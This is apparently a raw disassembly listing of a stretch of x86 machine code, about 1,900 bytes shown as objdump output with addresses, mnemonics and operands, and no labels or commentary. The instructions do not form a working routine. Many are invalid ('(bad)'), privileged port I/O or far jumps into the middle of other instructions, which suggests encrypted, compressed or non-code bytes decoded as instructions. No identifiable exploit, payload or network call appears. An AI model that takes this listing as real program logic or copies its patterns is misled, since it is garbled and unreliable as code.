  41e32c:	out    dx,al
  41e32d:	mov    edi,0xd30ca80e
  41e332:	jl     0x41e391
  41e334:	jne    0x41e39d
  41e336:	xchg   ecx,eax
  41e337:	xor    DWORD PTR [edi+0x1072efa3],0xffffff96
  41e33e:	adc    edi,edi
  41e340:	ret    
  41e341:	mov    ch,0xa6
  41e343:	mov    edi,0x5599523c
  41e348:	sbb    eax,0xff8a9508
  41e34d:	mov    ebp,0x6c462b68
  41e352:	inc    edi
  41e353:	in     eax,dx
  41e354:	mov    DWORD PTR [edx-0x78],ebx
  41e357:	push   edx
  41e358:	bound  esi,QWORD PTR [esi+0x30bb7136]
  41e35e:	ins    BYTE PTR es:[edi],dx
  41e35f:	ins    DWORD PTR es:[edi],dx
  41e360:	push   edx
  41e361:	add    BYTE PTR [esi+0xe],al
  41e364:	xchg   al,dl
  41e366:	add    DWORD PTR [ebx+0x78],esi
  41e369:	retf   0x3b62
  41e36c:	rcl    DWORD PTR [eax],1
  41e36e:	jmp    0x41e361
  41e370:	test   dh,dl
  41e372:	aaa    
  41e373:	aas    
  41e374:	stos   BYTE PTR es:[edi],al
  41e375:	repnz cmc 
  41e377:	push   edx
  41e378:	outs   dx,BYTE PTR ds:[esi]
  41e379:	sub    eax,0xd5d81a43
  41e37e:	(bad)  
  41e37f:	pusha  
  41e380:	dec    eax
  41e381:	xchg   esp,eax
  41e382:	dec    ebx
  41e383:	mov    ds:0x5188271,al
  41e388:	ins    DWORD PTR es:[edi],dx
  41e389:	mov    ah,0x8b
  41e38b:	push   cs
  41e38c:	test   BYTE PTR [ebx+0x57],ch
  41e38f:	outs   dx,BYTE PTR ds:[esi]
  41e390:	jns    0x41e39c
  41e392:	pop    edx
  41e393:	nop
  41e394:	ds retf 0xe261
  41e398:	push   0x5e
  41e39a:	sahf   
  41e39b:	ds mov ah,0x3e
  41e39e:	jbe    0x41e3dc
  41e3a0:	jbe    0x41e3e8
  41e3a2:	sub    bh,BYTE PTR [ecx+eiz*8]
  41e3a5:	xchg   esp,eax
  41e3a6:	add    ch,BYTE PTR [ebx+0x28]
  41e3a9:	mov    ds:0x793b826,al
  41e3ae:	jge    0x41e393
  41e3b0:	push   ecx
  41e3b1:	push   es
  41e3b2:	hlt    
  41e3b3:	mov    edx,0x27aba95a
  41e3b8:	mov    al,ds:0xa8245cdd
  41e3bd:	arpl   WORD PTR [edx+0x0],bp
	...
  41e3c8:	add    BYTE PTR [eax],al
  41e3ca:	add    ah,dl
  41e3cc:	sqrtps xmm6,xmm0
  41e3cf:	(bad)  
  41e3d1:	cmc    
  41e3d2:	das    
  41e3d3:	sbb    BYTE PTR [eax],cl
  41e3d5:	xchg   ebx,eax
  41e3d6:	iret   
  41e3d7:	and    edi,DWORD PTR [ebp+edi*4-0x2e]
  41e3db:	(bad)  
  41e3dc:	mov    al,ds:0xac0001
  41e3e1:	add    BYTE PTR [eax],al
  41e3e3:	jo     0x41e3ca
  41e3e5:	inc    ebx
  41e3e6:	sti    
  41e3e7:	pop    ebp
  41e3e8:	enter  0xb99d,0x2b
  41e3ec:	pop    ebp
  41e3ed:	jb     0x41e39d
  41e3ef:	sub    DWORD PTR [ecx+0x49],ebp
  41e3f2:	ret    
  41e3f3:	popa   
  41e3f4:	push   eax
  41e3f5:	and    DWORD PTR [edx-0x80b42eb],0x5b
  41e3fc:	dec    esp
  41e3fd:	test   al,0x3f
  41e3ff:	pushf  
  41e400:	adc    BYTE PTR [eax+0x440a4f5f],ch
  41e406:	mov    esi,0x7b3d129d
  41e40b:	cs aaa 
  41e40d:	imul   ebx,DWORD PTR [ebx],0x6e584294
  41e413:	push   edx
  41e414:	stc    
  41e415:	jb     0x41e491
  41e417:	ffreep st(5)
  41e419:	jl     0x41e492
  41e41b:	aaa    
  41e41c:	pop    edx
  41e41d:	jecxz  0x41e426
  41e41f:	jge    0x41e3d0
  41e421:	iret   
  41e422:	inc    ecx
  41e423:	cmp    ebx,ebp
  41e425:	add    eax,0x88311dcd
  41e42a:	in     eax,0xf2
  41e42c:	xchg   edx,eax
  41e42d:	xchg   BYTE PTR [eax],cl
  41e42f:	add    al,0xc
  41e431:	pushf  
  41e432:	lock xlat BYTE PTR ds:[ebx]
  41e434:	push   ecx
  41e435:	push   ecx
  41e436:	cwde   
  41e437:	rcr    BYTE PTR [ebp+0x5dd3a0cc],0x2d
  41e43e:	mov    ch,0x4
  41e440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e441:	inc    edi
  41e442:	and    al,0x15
  41e444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e445:	mov    ebp,0x53d7f405
  41e44a:	icebp  
  41e44b:	mov    cl,0x14
  41e44d:	pushf  
  41e44e:	nop
  41e44f:	jae    0x41e46a
  41e451:	and    edx,DWORD PTR [edx-0x3bccbe80]
  41e457:	out    0x30,eax
  41e459:	pushf  
  41e45a:	sbb    eax,0x2616333d
  41e45f:	add    al,0xc1
  41e461:	(bad)  
  41e462:	xor    eax,0xa9e5ba33
  41e467:	sub    al,0x30
  41e469:	jns    0x41e475
  41e46b:	mov    edx,DWORD PTR [eax-0x5c]
  41e46e:	js     0x41e4cf
  41e470:	(bad)  
  41e472:	aam    0x97
  41e474:	lock les esp,FWORD PTR [ecx-0x79]
  41e478:	repz neg dl
  41e47b:	fs je  0x41e41a
  41e47e:	pop    eax
  41e47f:	daa    
  41e480:	and    al,0x80
  41e482:	repz and ch,0x3b
  41e486:	les    ebx,FWORD PTR [eax+edi*2+0x4167f559]
  41e48d:	pop    edx
  41e48e:	or     eax,0x0
	...
  41e49b:	int    0x2d
  41e49d:	xchg   ebp,eax
  41e49e:	inc    ebx
  41e49f:	cmc    
  41e4a0:	sti    
  41e4a1:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e4a7:	mov    ?,WORD PTR [edx+0x36]
  41e4aa:	dec    eax
  41e4ab:	cmp    esp,DWORD PTR [ecx+0xac0001]
  41e4b1:	add    BYTE PTR [eax],al
  41e4b3:	sahf   
  41e4b4:	mov    dh,0xb8
  41e4b6:	and    esi,edx
  41e4b8:	cmp    DWORD PTR [ebx+0x7235d446],eax
  41e4be:	(bad)  
  41e4c0:	mov    al,ds:0x1a4f5e1e
  41e4c5:	pop    DWORD PTR [edi+0x58]
  41e4c8:	lock std 
  41e4ca:	xchg   esi,eax
  41e4cb:	mov    ebp,0xb629aaa5
  41e4d0:	stc    
  41e4d1:	pop    edx
  41e4d2:	lods   al,BYTE PTR ds:[esi]
  41e4d3:	daa    
  41e4d4:	adc    ch,BYTE PTR [edx-0x383e1ee]
  41e4da:	test   eax,0xfce07c5c
  41e4df:	daa    
  41e4e0:	frstor [eax]
  41e4e2:	iret   
  41e4e3:	mov    edi,0xb34540a5
  41e4e8:	pop    esp
  41e4e9:	mov    ebx,0x1fa45020
  41e4ee:	xor    eax,esp
  41e4f0:	lds    ecx,FWORD PTR [ebx]
  41e4f2:	xor    DWORD PTR [eax],esp
  41e4f4:	add    al,0x91
  41e4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4f7:	lods   eax,DWORD PTR ds:[esi]
  41e4f8:	pop    ds
  41e4f9:	outs   dx,BYTE PTR ds:[esi]
  41e4fa:	scas   eax,DWORD PTR es:[edi]
  41e4fb:	cs pop esp
  41e4fd:	out    0x53,al
  41e4ff:	dec    ebx
  41e500:	push   edx
  41e501:	cmp    cl,BYTE PTR [edx+ebx*2]
  41e504:	pop    ebp
  41e505:	in     al,dx
  41e506:	dec    esi
  41e507:	stos   BYTE PTR es:[edi],al
  41e508:	je     0x41e54a
  41e50a:	inc    edx
  41e50b:	loop   0x41e586
  41e50d:	sub    DWORD PTR [esp+edi*1],eax
  41e510:	mov    DWORD PTR [ebp-0x6f0ef3ae],0xc9cc4a30
  41e51a:	xchg   ebx,edx
  41e51c:	or     al,0xb6
  41e51e:	push   0xffffff8b
  41e520:	cmp    eax,0x939a414d
  41e525:	jne    0x41e4d9
  41e527:	push   ebx
  41e528:	xchg   ebp,eax
  41e529:	int    0x4c
  41e52b:	sbb    DWORD PTR [edx-0x4f682744],ecx
  41e531:	sub    ebp,DWORD PTR [eax-0x79437adc]
  41e537:	(bad)  
  41e538:	test   eax,0x384eb9a2
  41e53d:	out    0x11,eax
  41e53f:	xchg   DWORD PTR [ebx],esi
  41e541:	outs   dx,BYTE PTR es:[esi]
  41e543:	loop   0x41e55f
  41e545:	mov    ds:0x39b7df37,eax
  41e54a:	test   BYTE PTR [ecx+0x63],dl
  41e54d:	rcr    BYTE PTR [esi+0x265a0964],cl
  41e553:	xor    edx,DWORD PTR [ebx]
  41e555:	and    BYTE PTR [edi],0x82
  41e558:	push   edx
  41e559:	xchg   DWORD PTR [ebx+ebp*2+0x6a9ee5],edx
	...
  41e568:	add    BYTE PTR [eax],al
  41e56a:	add    BYTE PTR [ebx],dl
  41e56c:	fs out 0xb,eax
  41e56f:	test   DWORD PTR [ebx-0xce58301],0xc9d34cfc
  41e579:	in     eax,0x56
  41e57b:	out    0xa1,eax
  41e57d:	add    DWORD PTR [eax],eax
  41e57f:	lods   al,BYTE PTR ds:[esi]
  41e580:	add    BYTE PTR [eax],al
  41e582:	add    BYTE PTR [ecx+eax*4-0x44],ch
  41e586:	fdiv   QWORD PTR [edi]
  41e588:	cmp    eax,0x8107c4cc
  41e58d:	iret   
  41e58e:	xchg   esp,eax
  41e58f:	test   al,0x5b
  41e591:	mov    ebx,0x1572df44
  41e596:	cwde   
  41e597:	mov    BYTE PTR [ebp-0x6c],bh
  41e59a:	and    dl,BYTE PTR [eax+esi*2]
  41e59d:	xchg   ecx,eax
  41e59e:	int    0xc5
  41e5a0:	dec    ebp
  41e5a1:	aad    0x36
  41e5a3:	sub    BYTE PTR [esi],cl
  41e5a5:	push   ebp
  41e5a6:	pop    es
  41e5a7:	mov    ecx,0x5a25a83c
  41e5ac:	retf   0xfb89
  41e5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5b0:	scas   eax,DWORD PTR es:[edi]
  41e5b1:	pop    ebx
  41e5b2:	arpl   bp,dx
  41e5b4:	sti    
  41e5b5:	and    al,0x2b
  41e5b7:	sbb    al,0x2f
  41e5b9:	outs   dx,DWORD PTR ds:[esi]
  41e5ba:	cmp    DWORD PTR [edi+0x5f0332c8],0x2
  41e5c1:	data16 sbb al,0xe5
  41e5c4:	adc    ebp,DWORD PTR cs:[ecx-0x4957e99e]
  41e5cb:	adc    BYTE PTR [ecx],dl
  41e5cd:	mov    ah,0x10
  41e5cf:	cs jb  0x41e63a
  41e5d2:	cdq    
  41e5d3:	cmp    BYTE PTR [edi],ah
  41e5d5:	adc    DWORD PTR [eax-0x33f4eb3f],eax
  41e5db:	fisttp QWORD PTR [ecx+0x33]
  41e5de:	(bad)  
  41e5df:	mov    esi,0x801ff30
  41e5e4:	or     edi,ecx
  41e5e6:	mov    ecx,0xcf179bbd
  41e5eb:	inc    ebx
  41e5ec:	lods   al,BYTE PTR ds:[esi]
  41e5ed:	xchg   edx,eax
  41e5ee:	jns    0x41e607
  41e5f0:	or     esi,esi
  41e5f2:	sbb    esi,eax
  41e5f4:	mov    esi,0xff0563ab
  41e5f9:	inc    eax
  41e5fa:	rol    DWORD PTR [edi],cl
  41e5fc:	fnstenv [esi]
  41e5fe:	mov    bh,0xba
  41e600:	in     al,0xed
  41e602:	mov    ecx,0x52ebb9b9
  41e607:	(bad)  
  41e609:	pop    ebp
  41e60a:	dec    ecx
  41e60b:	xor    al,BYTE PTR [ecx-0x75]
  41e60e:	push   0xffffffe2
  41e610:	jp     0x41e665
  41e612:	out    0xc5,al
  41e614:	ds dec edx
  41e616:	or     ch,BYTE PTR [ebx+0x71bc12f6]
  41e61c:	add    eax,0xd64fddcd
  41e621:	ds pusha 
  41e623:	in     al,dx
  41e624:	dec    esi
  41e625:	push   ebx
  41e626:	test   ah,bh
  41e628:	lds    ecx,FWORD PTR [edi-0x2f]
  41e62b:	test   edx,esi
  41e62d:	outs   dx,DWORD PTR ds:[esi]
  41e62e:	mov    ds:0x0,eax
	...
  41e63b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e63f:	jne    0x41e6a0
  41e641:	jg     0x41e67d
  41e643:	clc    
  41e644:	cs aas 
  41e646:	push   0x75a9739f
  41e64b:	arpl   WORD PTR [edx+0xac0001],cx
  41e651:	add    BYTE PTR [eax],al
  41e653:	sub    DWORD PTR [esi+0x1],0xffffffca
  41e657:	aaa    
  41e658:	aad    0xec
  41e65a:	sbb    BYTE PTR [ebx-0x1f57f951],bl
  41e660:	mov    cl,0x6e
  41e662:	add    BYTE PTR ds:0xc24c62a,cl
  41e668:	test   al,0x64
  41e66a:	xor    ch,BYTE PTR [eax-0x10784a38]
  41e670:	retf   
  41e671:	inc    ecx
  41e672:	lods   al,BYTE PTR ds:[esi]
  41e673:	not    BYTE PTR [edi-0x44]
  41e676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e677:	inc    eax
  41e678:	int3   
  41e679:	lock xchg bl,bh
  41e67c:	adc    ebx,DWORD PTR [ebx]
  41e67e:	gs jecxz 0x41e6e8
  41e681:	and    dh,cl
  41e683:	(bad)  
  41e684:	orps   xmm7,XMMWORD PTR [ebx+0x36]
  41e688:	jb     0x41e66c
  41e68a:	test   eax,0x2d1c3026
  41e68f:	mov    bl,BYTE PTR [ebp+ebp*2+0x57]
  41e693:	xlat   BYTE PTR ds:[ebx]
  41e694:	mov    DWORD PTR [edi+0x2d],edx
  41e697:	clc    
  41e698:	hlt    
  41e699:	pop    edx
  41e69a:	sub    DWORD PTR [ebp-0x3e51f208],ebx
  41e6a0:	icebp  
  41e6a1:	adc    BYTE PTR [ebx],dl
  41e6a3:	adc    bp,bp
  41e6a6:	pop    edi
  41e6a7:	adc    esi,DWORD PTR [ecx+0x25]
  41e6aa:	les    edx,FWORD PTR [edi]
  41e6ac:	cmp    cl,0xee
  41e6af:	cmp    BYTE PTR [eax+0x27],al
  41e6b2:	add    DWORD PTR [ecx-0x72b0e948],0xffffffb9
  41e6b9:	sbb    al,0xc1
  41e6bb:	mov    BYTE PTR [esi-0x7280386a],ah
  41e6c1:	dec    ecx
  41e6c2:	push   ss
  41e6c3:	call   0xc900:0x37b983d4
  41e6ca:	stos   DWORD PTR es:[edi],eax
  41e6cb:	sub    ebp,edx
  41e6cd:	call   0x3c57:0x4f6f7e76
  41e6d4:	sbb    DWORD PTR [esi],edi
  41e6d6:	pop    esi
  41e6d7:	pop    esi
  41e6d8:	jnp    0x41e73e
  41e6da:	out    dx,al
  41e6db:	dec    ebp
  41e6dc:	jg     0x41e660
  41e6de:	rcl    DWORD PTR [edi-0x43],1
  41e6e1:	inc    esp
  41e6e2:	pop    ds
  41e6e3:	inc    edi
  41e6e4:	(bad)  
  41e6e5:	lods   eax,DWORD PTR ds:[esi]
  41e6e6:	and    al,0x9d
  41e6e8:	retf   0x2f71
  41e6eb:	jnp    0x41e750
  41e6ed:	sub    eax,0x9c6dad57
  41e6f2:	jb     0x41e734
  41e6f4:	repz cld 
  41e6f6:	int    0xab
  41e6f8:	cwde   
  41e6f9:	pop    es
  41e6fa:	mov    BYTE PTR [bp+si-0x3c],ah
  41e6fe:	out    0x0,eax
	...
  41e708:	add    BYTE PTR [eax],al
  41e70a:	add    BYTE PTR [eax],cl
  41e70c:	mov    cl,0x72
  41e70e:	cmp    edi,ebx
  41e710:	sti    
  41e711:	dec    ecx
  41e712:	mov    bl,0x94
  41e714:	je     0x41e6ed
  41e716:	call   0x8b0f:0x90a99119
  41e71d:	add    DWORD PTR [eax],eax
  41e71f:	lods   al,BYTE PTR ds:[esi]
  41e720:	add    BYTE PTR [eax],al
  41e722:	add    BYTE PTR [eax-0xae0aad8],ch
  41e728:	loop   0x41e797
  41e72a:	loopne 0x41e74f
  41e72c:	aam    0x3b
  41e72e:	bound  esi,QWORD PTR [edx]
  41e730:	(bad)  ds:[edx-0x206118c4]
  41e737:	iret   
  41e738:	pop    ebp
  41e739:	mov    bh,0x7b
  41e73b:	jnp    0x41e735
  41e73d:	cwde   
  41e73e:	loope  0x41e705
  41e740:	inc    edx
  41e741:	sub    ch,BYTE PTR [edi]
  41e743:	add    dh,BYTE PTR [ebx]
  41e745:	sbb    eax,0x6104af0
  41e74a:	cmp    DWORD PTR ds:0xfe2f6f85,esi
  41e750:	sbb    DWORD PTR [edi-0x7f],edx
  41e753:	loop   0x41e6db
  41e755:	and    al,0x4a
  41e757:	mov    ah,ah
  41e759:	dec    ebp
  41e75a:	mov    ah,0xff
  41e75c:	dec    edx
  41e75d:	imul   ebp,DWORD PTR [ebx],0xe4380e57
  41e763:	in     eax,dx
  41e764:	mov    WORD PTR [ebp+0x3c],ss
  41e767:	inc    edx
  41e768:	cmp    DWORD PTR [ebp-0x60be14ea],edx
  41e76e:	xchg   edx,eax
  41e76f:	push   ds
  41e770:	mov    al,BYTE PTR [ebp-0x4534a699]
  41e776:	push   ds
  41e777:	push   ds
  41e778:	mov    cl,BYTE PTR ds:0x16b9aeb6
  41e77e:	sti    
  41e77f:	arpl   WORD PTR [ebp-0x48],sp
  41e782:	adc    eax,0x5233dd65
  41e787:	push   ss
  41e788:	mov    al,0x4f
  41e78a:	sbb    ah,bl
  41e78c:	cwde   
  41e78d:	and    ebp,edi
  41e78f:	xchg   dl,dl
  41e791:	or     cl,BYTE PTR [ebp-0x70]
  41e794:	repz fidiv DWORD PTR [edx-0x18]
  41e798:	dec    ecx
  41e799:	dec    ebx
  41e79a:	push   edi
  41e79b:	sbb    esp,DWORD PTR [edx-0x284fd2e5]
  41e7a1:	inc    esi
  41e7a2:	dec    edx
  41e7a3:	sbb    al,0xf5
  41e7a5:	add    ebp,DWORD PTR [edx-0x2e]
  41e7a8:	add    ah,BYTE PTR [edi+edi*1+0x3e]
  41e7ac:	scas   eax,DWORD PTR es:[edi]
  41e7ad:	mov    eax,ds:0x3825b81b
  41e7b2:	test   eax,0xd32d5de5
  41e7b7:	pop    esi
  41e7b8:	mov    ah,0x30
  41e7ba:	sub    BYTE PTR [edx],bl
  41e7bc:	mov    esi,0x537a639e
  41e7c1:	pushf  
  41e7c2:	stc    
  41e7c3:	pop    ebx
  41e7c4:	(bad)  
  41e7c5:	or     al,0xdc
  41e7c7:	gs daa 
  41e7c9:	mov    al,0xd2
  41e7cb:	inc    edx
  41e7cd:	fist   WORD PTR [edi+0x0]
	...
  41e7d8:	add    BYTE PTR [eax],al
  41e7da:	add    bh,bl
  41e7dc:	push   ebx
  41e7dd:	mov    dl,0x4f
  41e7df:	mov    esi,0x67d3ffef
  41e7e4:	xchg   ecx,edi
  41e7e6:	adc    al,0xe1
  41e7e8:	and    BYTE PTR [ecx+ecx*1],cl
  41e7eb:	mov    ebx,0xac00018b
  41e7f0:	add    BYTE PTR [eax],al
  41e7f2:	add    BYTE PTR [ecx+0x47da8920],dl
  41e7f8:	repz dec ebp
  41e7fa:	aam    0xd4
  41e7fc:	adc    ebx,ecx
  41e7fe:	cmc    
  41e7ff:	dec    esi
  41e800:	and    al,0xaa
  41e802:	sbb    DWORD PTR [edx+0x18],ebx
  41e805:	in     eax,dx
  41e806:	fcomp  QWORD PTR [eax+0x93cabd6]
  41e80c:	inc    eax
  41e80d:	jo     0x41e86e
  41e80f:	clc    
  41e810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e811:	inc    ebp
  41e812:	fist   WORD PTR [eax]
  41e814:	cmp    al,bl
  41e816:	sub    DWORD PTR [ecx+0x7d],edx
  41e819:	push   ebp
  41e81a:	mov    esi,DWORD PTR [edi]
  41e81c:	clc    
  41e81d:	push   esi
  41e81e:	inc    eax
  41e81f:	jecxz  0x41e828
  41e821:	and    bl,BYTE PTR [edi]
  41e823:	dec    ebx
  41e824:	dec    BYTE PTR [ebx-0x9]
  41e827:	push   esp
  41e828:	retf   
  41e829:	stc    
  41e82a:	shl    DWORD PTR [ebx+eax*8+0x63f4f692],1
  41e831:	xchg   edx,eax
  41e832:	dec    ebp
  41e833:	(bad)  
  41e834:	gs test eax,0x4d73f1cd
  41e83a:	pop    ecx
  41e83b:	adc    edx,DWORD PTR [eax-0x12]
  41e83e:	in     eax,dx
  41e83f:	sub    dl,BYTE PTR [ebx-0x12c29307]
  41e845:	in     eax,dx
  41e846:	and    BYTE PTR [eax+0x17],ch
  41e849:	pushf  
  41e84a:	popf   
  41e84b:	dec    edi
  41e84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84d:	dec    eax
  41e84e:	test   eax,0xa04bf34c
  41e853:	imul   eax,DWORD PTR [edx-0x576bba40],0xfaaf4dde
  41e85d:	push   esp
  41e85e:	lods   al,BYTE PTR ds:[esi]
  41e85f:	ret    0xb194
  41e862:	push   ebx
  41e863:	bound  ebx,QWORD PTR [edx]
  41e865:	popf   
  41e866:	shl    DWORD PTR [esi-0x69adbf58],1
  41e86c:	call   0xca5e:0x40f79b74
  41e873:	fdiv   QWORD PTR [edi-0x5993161f]
  41e879:	sub    BYTE PTR [edi],bl
  41e87b:	int3   
  41e87c:	ins    DWORD PTR es:[edi],dx
  41e87d:	jp     0x41e85b
  41e87f:	push   esi
  41e880:	cld    
  41e881:	add    eax,0xb5fa5993
  41e886:	outs   dx,DWORD PTR ds:[esi]
  41e887:	pop    esi
  41e888:	pop    edx
  41e889:	mov    BYTE PTR [eax+0x2d],bh
  41e88c:	jno    0x41e82c
  41e88e:	adc    edx,DWORD PTR [ecx+ecx*8]
  41e891:	pushf  
  41e892:	test   DWORD PTR [ebp+eiz*2+0x4b],eax
  41e896:	ror    eax,1
  41e898:	popa   
  41e899:	mov    ds:0x3e192d41,eax
  41e89e:	clc    
	...
  41e8ab:	xchg   DWORD PTR [ebx+edx*8],ecx
  41e8ae:	fcmovu st,st(3)
  41e8b0:	fisttp WORD PTR [edi+0x640ccb5d]
  41e8b6:	push   ss
  41e8b7:	stc    
  41e8b8:	xchg   ecx,eax
  41e8b9:	pop    ebp
  41e8ba:	inc    ecx
  41e8bb:	mov    WORD PTR [bx+di],es
  41e8be:	add    BYTE PTR [eax+eax*1+0x406a0000],ch
  41e8c5:	cld    
  41e8c6:	mov    WORD PTR [esi],?
  41e8c8:	adc    al,0xeb
  41e8ca:	and    DWORD PTR [edx],ebp
  41e8cc:	xchg   edx,eax
  41e8cd:	xchg   DWORD PTR [eax],edi
  41e8cf:	dec    esp
  41e8d0:	jge    0x41e8d0
  41e8d2:	retf   
  41e8d3:	aaa    
  41e8d4:	mov    BYTE PTR [eax+edi*8+0x6],al
  41e8d8:	add    al,0x56
  41e8da:	cmp    al,0x67
  41e8dc:	xchg   edi,eax
  41e8dd:	mov    ebx,es
  41e8df:	inc    ecx
  41e8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8e1:	xchg   BYTE PTR [eax+0x52],bh
  41e8e4:	inc    esp
  41e8e5:	bound  ebx,QWORD PTR [ecx]
  41e8e7:	jmp    0x48ccec75
  41e8ec:	xchg   edx,eax
  41e8ed:	mov    ecx,es
  41e8ef:	retf   0x560
  41e8f2:	jle    0x41e8c7
  41e8f4:	leave  
  41e8f5:	popa   
  41e8f6:	std    
  41e8f7:	cmp    bl,dl
  41e8f9:	and    al,0x8
  41e8fb:	xor    eax,0x1e3c196a
  41e900:	mov    BYTE PTR [eax],al
  41e902:	xor    ah,cl
  41e904:	adc    ecx,DWORD PTR [edx+0x40]
  41e907:	push   edx
  41e908:	iret   
  41e909:	jns    0x41e8a5
  41e90b:	inc    eax
  41e90c:	clc    
  41e90d:	jecxz  0x41e93a
  41e90f:	inc    edi
  41e910:	mov    al,ds:0x65399f14
  41e915:	stos   DWORD PTR es:[edi],eax
  41e916:	and    ah,BYTE PTR [ecx-0x71]
  41e919:	cmp    al,0x53
  41e91b:	fisttp DWORD PTR [ebp+0x57038c88]
  41e921:	aas    
  41e922:	xchg   edx,eax
  41e923:	scas   al,BYTE PTR es:[edi]
  41e924:	dec    ebp
  41e925:	fidiv  DWORD PTR [edi-0x4d84dc56]
  41e92b:	cmp    ebx,ebx
  41e92d:	mov    edi,DWORD PTR [ecx+0x1b74e382]
  41e933:	push   esp
  41e934:	es push edx
  41e936:	jno    0x41e8fb
  41e938:	pop    ss
  41e939:	out    dx,eax
  41e93a:	shl    DWORD PTR [ecx+0x28c0535b],1
  41e940:	pop    es
  41e941:	je     0x41e914
  41e943:	xchg   esp,eax
  41e944:	xchg   DWORD PTR [edx+0x4e],ecx
  41e947:	sub    BYTE PTR [ebp-0x2ab17300],al
  41e94d:	std    
  41e94e:	shl    BYTE PTR [eax+0x15],cl
  41e951:	add    ecx,DWORD PTR [ebx-0x23]
  41e954:	jge    0x41e914
  41e956:	and    DWORD PTR [edi],eax
  41e958:	push   cs
  41e959:	(bad)  
  41e95a:	dec    edi
  41e95b:	rcl    ebx,1
  41e95d:	pop    edi
  41e95e:	aas    
  41e95f:	sbb    dh,BYTE PTR ds:[edx]
  41e962:	xchg   DWORD PTR [edi-0x4362e0ba],edi
  41e968:	and    ah,bh
  41e96a:	aaa    
  41e96b:	jne    0x41e935
  41e96d:	xchg   edi,eax
  41e96e:	stc    
	...
  41e97b:	lahf   
  41e97c:	arpl   WORD PTR [ebp+0x72],cx
  41e97f:	std    
  41e980:	jle    0x41e941
  41e982:	out    dx,eax
  41e983:	sbb    edi,esp
  41e985:	mov    BYTE PTR [edi+esi*8+0x1339f9a7],dh
  41e98c:	lea    eax,[ecx]
  41e98e:	add    BYTE PTR [eax+eax*1-0x5c640000],ch
  41e995:	xchg   DWORD PTR [ecx],ecx
  41e997:	ds out 0xaa,al
  41e99a:	call   0xafcbbf76
  41e99f:	imul   edx,DWORD PTR [esi-0x29],0xec01bbe5
  41e9a6:	xor    eax,0x85223aa6
  41e9ab:	inc    eax
  41e9ac:	retf   
  41e9ad:	push   edi
  41e9ae:	inc    ebx
  41e9af:	dec    ebp
  41e9b0:	mov    dl,0x76
  41e9b2:	push   ebx
  41e9b3:	loope  0x41e957
  41e9b5:	imul   edx,ecx,0xffffff9a
  41e9b8:	vcmpss xmm6,xmm1,xmm1,0xe8
  41e9bd:	ret    
  41e9be:	cmc    
  41e9bf:	popf   
  41e9c0:	xchg   esp,eax
  41e9c1:	ret    0xbbb1
  41e9c4:	push   esp
  41e9c5:	sbb    al,0xde
  41e9c7:	hlt    
  41e9c8:	aaa    
  41e9c9:	fwait
  41e9ca:	pop    es
  41e9cb:	mov    ds:0x1d465622,eax
  41e9d0:	pop    edi
  41e9d1:	ror    BYTE PTR [edx],cl
  41e9d3:	dec    cl
  41e9d5:	dec    edx
  41e9d6:	sub    al,0x71
  41e9d8:	outs   dx,BYTE PTR ds:[esi]
  41e9d9:	out    dx,eax
  41e9da:	pop    esp
  41e9db:	aad    0xfe
  41e9dd:	xchg   esi,eax
  41e9de:	mov    edx,0xccb62913
  41e9e3:	adc    al,0xd4
  41e9e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9e6:	adc    ebx,esi
  41e9e8:	mov    dh,0x7a
  41e9ea:	sub    eax,0x1f3b25ab
  41e9ef:	sub    DWORD PTR [esp+esi*2],ebp
  41e9f2:	push   edx
  41e9f3:	lods   al,BYTE PTR ds:[esi]
  41e9f4:	iret   
  41e9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9f6:	xchg   ebp,eax
  41e9f7:	iret   
  41e9f8:	cmp    al,0xc1
  41e9fa:	mov    cl,0x78
  41e9fc:	imul   ebp,DWORD PTR [esi-0x6e42f12a],0xffffffb4
  41ea03:	sahf   
  41ea04:	(bad)  
  41ea06:	mov    ebp,0x8aba2c
  41ea0b:	xlat   BYTE PTR ds:[ebx]
  41ea0c:	push   es
  41ea0d:	inc    ebp
  41ea0e:	lock in eax,0x1d
  41ea11:	fs mov dh,0xd
  41ea14:	or     al,0xb5
  41ea16:	out    dx,al
  41ea17:	add    bl,BYTE PTR [edx]
  41ea19:	push   esp
  41ea1a:	in     eax,0xc8
  41ea1c:	cmp    edx,DWORD PTR [eax+edx*8]
  41ea1f:	hlt    
  41ea20:	cmp    eax,0x12c40f60
  41ea25:	lods   al,BYTE PTR ds:[esi]
  41ea26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea27:	(bad)  
  41ea28:	std    
  41ea29:	pop    esi
  41ea2a:	das    
  41ea2b:	xchg   esi,eax
  41ea2c:	pop    es
  41ea2d:	mov    al,BYTE PTR [ebx+ecx*4]
  41ea30:	or     edx,DWORD PTR [edi]
  41ea32:	out    dx,al
  41ea33:	xor    ah,BYTE PTR [eax-0x7c1c7e83]
  41ea39:	jmp    0xd2eb5839
  41ea3e:	cmp    eax,DWORD PTR [eax]
	...
  41ea48:	add    BYTE PTR [eax],al
  41ea4a:	add    BYTE PTR [eax+0x23],dh
  41ea4d:	and    eax,0x7c6f7769
  41ea52:	cmp    esp,DWORD PTR [eax-0x194311e4]
  41ea58:	add    edx,DWORD PTR [ebx]
  41ea5a:	push   ebx
  41ea5b:	mov    edi,0xac00018d
  41ea60:	add    BYTE PTR [eax],al
  41ea62:	add    ah,cl
  41ea64:	inc    ebx
  41ea65:	(bad)  
  41ea66:	jg     0x41eaa8
  41ea68:	adc    eax,ecx
  41ea6a:	nop
  41ea6b:	pop    ds
  41ea6c:	push   eax
  41ea6d:	iret   
  41ea6e:	mov    eax,ds:0xe4e32679
  41ea73:	adc    ebp,ebp
  41ea75:	sbb    al,ah
  41ea77:	adc    bl,BYTE PTR [ebx+0x6]
  41ea7a:	xchg   esp,eax
  41ea7b:	dec    esi
  41ea7c:	mov    al,ds:0x644d55a2
  41ea81:	pop    es
  41ea82:	je     0x41eabc
